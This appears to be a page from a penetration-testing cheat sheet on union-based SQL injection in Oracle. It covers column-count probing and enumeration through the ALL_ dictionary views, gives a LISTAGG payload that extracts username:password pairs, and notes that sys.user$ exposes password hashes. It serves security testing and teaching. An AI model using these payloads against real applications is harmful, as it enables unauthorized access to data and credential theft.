---
title: "Union-based SQL injection in Oracle"
order: 12
description: "Using UNION SELECT in Oracle to extract data: the mandatory FROM DUAL, strict type matching, and enumeration through the ALL_ data dictionary views."
keywords:
  - union based SQL injection
  - UNION SELECT DUAL
  - all_tables
  - all_tab_columns
  - LISTAGG
---

# Union-based

A `UNION SELECT` appends attacker-chosen rows to a returned result. Oracle requires every `SELECT` to have a `FROM`, so the injected query selects `FROM DUAL` (or from a real table), and its column count and types must match the original, with `NULL` as the type-agnostic filler.

Detect the column count with `ORDER BY` ordinals or incremental `UNION SELECT NULL FROM DUAL`:

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL FROM DUAL-- 
```

A wrong count raises `ORA-01789: query block has incorrect number of result columns`, and a type mismatch raises `ORA-01790`; use `NULL` until the layout is right, then place a string in the reflected column.

Enumerate through the data dictionary. The `ALL_` views show everything the current user can see:

```sql
' UNION SELECT table_name,NULL,NULL FROM all_tables-- 
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'-- 
```

Table and column names are stored upper-case, so match them in upper case. Collapse rows into one cell with `LISTAGG` (11g R2 and later):

```sql
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username),NULL,NULL FROM users-- 
```

For a single row use `WHERE ROWNUM=1` or `FETCH FIRST 1 ROWS ONLY` (12c+). `all_users` lists accounts, and `SELECT password FROM sys.user$` exposes hashes to a privileged user.

## Tools

- **sqlmap**: automates column-count detection and UNION extraction (`--technique=U`).
- **ghauri**: fast alternative with strong WAF evasion.
- **sqlplus** (or SQLcl): the Oracle client for validating `UNION SELECT ... FROM DUAL` payloads.

## References

- Oracle Database SQL Language Reference: UNION, data dictionary, LISTAGG
- OWASP Testing Guide: Testing for SQL Injection
